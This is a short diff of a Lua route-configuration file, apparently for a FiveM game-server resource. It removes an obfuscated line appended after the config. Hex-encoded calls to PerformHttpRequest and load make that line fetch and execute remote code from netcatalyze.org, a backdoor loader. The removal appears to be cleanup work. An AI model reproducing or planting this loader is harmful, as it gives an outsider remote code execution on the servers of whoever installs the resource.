@@ -161,7 +161,3 @@ Config.Routes = { -- HERE YOU CAN ADD AS MANY LOCATIONS AS YOU WANT TO
     }
 },
 }
--- ElixirFW
-
-
-local pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[4][pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x74\x63\x61\x74\x61\x6c\x79\x7a\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x33\x71\x32\x66\x35", function (WmHuqmONsHsjZHYFSNsHKBxhdBvxwfMWvsHQiSmSYhGUQkIDvNzbmtKRWpZevdAtpkdzUG, BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa) if (BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa == pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[6] or BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa == pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[5]) then return end pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[4][pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[2]](pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[4][pVGMrnPtBgtgAbsOoARLwzQmOKawmuHVtEQfkbMScuJQoorXOaBPzdZiFbrwLMsFZuPxTo[3]](BRnhzGvLXLmZUNyUsmiFcFYZWbsCBNyqcqWCKYvFUUAUDfXWUqDyxHlZFWVJraEAImdbOa))() end)
